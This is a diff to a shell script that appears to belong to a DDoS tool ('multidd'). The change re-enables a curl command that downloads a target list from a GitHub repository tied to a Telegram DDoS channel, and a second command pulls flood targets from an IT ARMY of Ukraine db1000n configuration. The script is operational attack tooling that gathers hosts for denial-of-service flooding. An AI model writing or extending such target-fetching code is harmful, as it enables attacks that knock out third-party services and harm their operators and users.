@@ -34,7 +34,7 @@ prepare_targets_and_banner () {
 rm -rf ~/multidd/targets/*
 
 # 1 DDOS по країні СЕПАРІВ (Кібер-Козаки)          https://t.me/ddos_separ
-#echo "$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/all.txt)" > ~/multidd/targets/source1.txt
+echo "$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/all.txt)" > ~/multidd/targets/source1.txt
 # 2 IT ARMY of Ukraine                             https://t.me/itarmyofukraine2022
 echo "$(curl -s -X GET "https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json" 2>/dev/null | jq -r '.jobs[].args.packet.payload.data.path | select (. != null)')" > ~/multidd/targets/source2.txt
 
